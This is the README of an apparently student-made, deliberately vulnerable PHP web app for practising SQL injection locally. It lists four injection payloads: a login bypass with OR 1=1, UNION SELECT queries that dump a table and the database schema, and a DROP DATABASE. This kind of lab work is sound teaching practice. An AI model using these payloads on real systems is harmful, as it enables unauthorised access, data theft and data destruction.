# SQL Injection Dummy Target - README

Welcome to the SQL Injection Dummy Target repository! This project was created as part of my Information Systems Security course assignment, allowing users to experience simulated SQL injection attacks in a controlled environment.

## Features
- **Simulated Attacks**: Explore and understand SQL injection vulnerabilities through a safe and controlled environment.
- **Interactive Learning**: Learn about potential database security risks and how to prevent them by interacting with the dummy target.
- **Visual Representation**: Check out the project's preview image below.

![Preview](preview.png)

## Installation
1. Clone this repository to your local machine using `git clone https://github.com/fintisalsabila/sql-injection-dummy-target.git`.
2. Set up a local server environment (e.g., XAMPP, WAMP, or similar) to run PHP scripts.

## Usage
1. Configure your local server to host the project.
2. Access the project via your browser by navigating to `http://localhost/sql-injection-dummy-target`.

Code for attacking this web :
- SELECT * FROM users WHERE username = '' AND password = '' OR 1=1 -- 
- SELECT * FROM users WHERE username = '' UNION ALL SELECT *, 1 FROM info_penting --
- SELECT * FROM users WHERE username = '' UNION ALL SELECT table_name, 1, 1 FROM information_schema.tables WHERE table_schema=database() -- 
- SELECT * FROM users WHERE username = '' DROP DATABASE security_challenge --

## Technologies Used
- PHP
- HTML
- CSS

---
Thank you for visiting my repository! Feel free to explore, learn, and experiment with SQL injection attacks safely. If you have any questions or feedback, please don't hesitate to reach out. Enjoy your learning journey!
